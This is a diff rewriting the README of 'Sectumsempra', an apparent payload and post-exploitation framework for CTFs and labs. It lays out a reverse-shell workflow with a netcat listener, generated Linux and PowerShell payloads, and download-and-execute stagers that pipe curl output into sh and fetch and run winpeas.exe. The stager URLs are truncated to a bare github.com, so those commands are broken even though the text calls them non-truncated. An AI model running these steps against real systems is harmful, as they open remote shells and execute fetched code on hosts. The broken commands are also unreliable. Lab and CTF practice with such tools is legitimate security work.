@@ -1,38 +1,83 @@
-# Sectumsempra Automated Stager and Script Generation Utility
+# Sectumsempra v1.0
 
-## System Overview
-Sectumsempra is an automated deployment framework designed to generate cross platform stagers, automated execution vectors, and persistence primitives for CTF environments. It evaluates local interfaces, resolves routing conflicts between active VPN structures and local area network interfaces, and outputs raw operational code blocks.
+**Sectumsempra** is an automated payload execution and post-exploitation auditing framework engineered for CTFs, labs, and authorized assessments, designed to immediately operationalize the findings provided by the NetWeave reconnaissance engine.
 
-## System Features and Link Integrity
-The utility integrates raw, non-truncated upstream stager download pipelines for system assessment tools:
-* Linux Execution Vector: curl -sL https://github.com | sh
-* Windows Execution Vector: iwr https://github.com -OutFile winpeas.exe; .\winpeas.exe
-
-## Multi Tab Operational Workflow
-
-### Terminal Tab 2 Payload Generation and Hosting
-Execute the script to dynamically bind to your active IP structure and define the target reverse listener port.
-
-```bash
-python3 sectumsempra.py LPORT
+```text
+TARGET ──► ATTACK PATH ──► FOOTHOLD PAYLOAD ──► REVERSE SHELL ──► PRIVILEGE ESCALATION
 ```
 
-Following generation, deploy a local web infrastructure server to host the generated payloads:
+## Deployment
 
+### 1. Clone & Setup
 ```bash
-python3 -m http.server 8080
+git clone https://github.com/danielissaq/Sectumsempra.git
+cd Sectumsempra
 ```
 
-### Terminal Tab 3 Local Network Listener Execution
-Prior to launching stagers on the target environment, initialize the listener architecture within the third terminal tab to intercept the oncoming connection payload:
-
+### 2. Set up Python
 ```bash
-rlwrap nc -lvnp LPORT
+python3 -m venv .venv
+source .venv/bin/activate
+python -m pip install --upgrade pip
+python -m pip install netifaces
 ```
 
-## System Output Log Format
-* Utilizing Local Network Binding Address HOST_IP
-* Utilizing Specified Listening Port LPORT
-* Linux Deployment Script Ready
-* Windows PowerShell Automation Script Ready
-* Sectumsempra Payload Generation Complete
+### 3. Verify Attack Interface
+Sectumsempra tracks local network topology to bind your listening interface. It will automatically prioritize your active TryHackMe VPN tunnel (`tun0`), but will seamlessly fall back to your local LAN/WLAN interface IP layout if no tunnel is detected:
+```bash
+ip a show tun0
+```
+
+## Complete Attack Workflow
+
+### 1. Recon Sequence (Primary Terminal Tab)
+Launch your reconnaissance infrastructure against the target machine using NetWeave:
+```bash
+python pwn_recon.py
+```
+Isolate the optimal entry point provided under the generated `GOLDEN PATH` analysis output block.
+
+### 2. Payload Sequence (Second Terminal Tab)
+Open a new terminal tab, navigate into your local repository workspace, and compile your custom staging shell sequences:
+```bash
+cd ~/Sectumsempra
+source .venv/bin/activate
+python3 sectumsempra.py
+```
+Input the targeted remote host IP address and assign your incoming listener port when prompted.
+
+### 3. Listener Sequence (Third Terminal Tab)
+Before executing any attack payloads on the target system, open a separate terminal tab and open your incoming port handler to receive the reverse connection loop:
+```bash
+nc -lvnp 4444
+```
+
+### 4. Post Exploitation Sequence (Active Shell Tab)
+Execute the payload script compiled by Sectumsempra against the target vulnerability vector discovered during the NetWeave phase. Once the active connection drops back into your waiting Netcat listener tab, copy and execute the embedded automated privilege escalation engine:
+
+**For Linux Targets (LinPEAS Live Memory Stager):**
+```bash
+curl -sL https://github.com | sh
+```
+
+**For Windows Targets (WinPEAS Live PowerShell Memory Stager):**
+```powershell
+iwr https://github.com -OutFile winpeas.exe; .\winpeas.exe
+```
+
+## Generated Payload
+Sectumsempra immediately processes your parameter inputs to output standalone multi-platform execution arrays inside your working path:
+```text
+payload_linux_<target>.sh
+payload_windows_<target>.ps1
+```
+
+## Requirements
+```text
+Python 3.10+
+netifaces library
+Netcat listener backend
+```
+
+## Legal Notice
+For authorized assessments and labs only against systems you have explicit permission to test.
